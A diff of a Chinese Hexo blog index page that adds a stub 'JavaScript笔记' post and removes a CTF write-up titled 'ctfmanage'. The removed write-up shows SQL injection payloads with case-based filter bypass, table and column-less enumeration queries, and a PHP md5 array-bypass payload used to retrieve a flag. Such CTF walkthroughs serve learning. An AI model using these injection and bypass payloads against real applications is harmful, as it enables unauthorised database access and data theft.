@@ -164,6 +164,95 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-JavaScript笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/">JavaScript笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-01-18T08:43:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>“js开发只用了十天”</p>
+<p>以后有时间补</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-Java注解与反射" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1188,155 +1277,6 @@ if &#39;flag&#123;&#39; in r.text:
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-ctfmanage" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/07/ctfmanage/">ctfmanage</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/10/07/ctfmanage/" class="archive-article-date">
-  	<time datetime="2021-10-07T14:29:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="ctfmanage"><a href="#ctfmanage" class="headerlink" title="ctfmanage"></a>ctfmanage</h3><p>转载自qq群<code>。</code>大佬发的md文件</p>
-<ul>
-<li>打开题目是一个登录框，加上字母发现直接报错，发现使用的是登录号，所以登录名是一个数字型参数，没有单引号包裹，而密码是一个字符型参数（所以注入点在用户名，密码随便填一个防止因为内容为空脚本验证不通过）：</li>
-</ul>
-<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318191.png" alt="image-20211002022340742" style="zoom:50%;" />
-
-<ul>
-<li>尝试输入用户名<code>1 or 1=1#</code>，发现被过滤，使用fuzz字典跑一下过滤值：</li>
-</ul>
-<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318192.png" alt="image-20211002023322880" style="zoom:50%;" />
-
-<ul>
-<li>想到用<code>union</code>联合注入，尝试了很多次但是没有成功，后来发现可以大小写绕过（笑，现在怎么这么多双层防护的题目）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,3;#</span><br><span class="line">1 Union Select 1,2,database();# &#x3D;&gt; ctf</span><br></pre></td></tr></table></figure>
-
-<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318193.png" alt="image-20211002031727834" style="zoom:50%;" />
-
-<ul>
-<li>由于or被过滤了，所以这里需要使用无表名注入，且<code>from</code>和<code>where</code>都需要大小写绕过：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,group_concat(table_name) From sys.schema_table_statistics_with_buffer Where table_schema&#x3D;database();# &#x3D;&gt; 没有输出</span><br><span class="line">1 Union Select 1,2,group_concat(table_name) From mysql.innodb_table_stats Where database_name &#x3D; database();#</span><br><span class="line">&#x3D;&gt; flagisthere,ilikectf</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>接下来就是无列名注入，以下两个payload都失败了：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select 1,2,&#96;3&#96; From (Select 1,2,3 Union Select * From ilikectf);#</span><br><span class="line">1 Union Select 1,2,b From (Select 1,2,3 As b,4,5 Union Select * From ilikectf)a;#</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>最后使用下面式子成功：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 Union Select * From ilikectf;# &#x3D;&gt; 36476,sgrsgef,gg.php</span><br></pre></td></tr></table></figure>
-
-<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318194.png" alt="image-20211002031655165" style="zoom:50%;" />
-
-<ul>
-<li>来到<code>gg.php</code>：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(base64_encode(hex2bin(strrev(bin2hex(<span class="variable">$_GET</span>[<span class="string">&#x27;sy&#x27;</span>]))))===<span class="variable">$secret</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ohhhhh so close !!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>后一个是md5数组绕过。另外一个<code>$secret</code>变量，让我们回想起首页页面源代码中的字符：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 告诉你一个秘密: hjZX1pcnVmdmRzZWZ&#x2F;bGlg&#x3D;&#x3D; --&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>将其反过来解密即可：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo hex2bin(strrev(bin2hex(base64_decode(&#39;hjZX1pcnVmdmRzZWZ&#x2F;bGlg&#x3D;&#x3D;&#39;))));</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ilovectfverymuch</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>所以最后的payload：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?sy&#x3D;ilovectfverymuch</span><br><span class="line">POST:</span><br><span class="line">ha[]&#x3D;a&amp;lo[]&#x3D;b</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>获得flag：</li>
-</ul>
-<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318195.png" alt="image-20211002031342627" style="zoom:50%;" />
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;23c2e3e4-d2f8-4770-9c7d-84142263a47a&#125;</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/07/ctfmanage/">展开全文 >></a>
         </p>
       
 
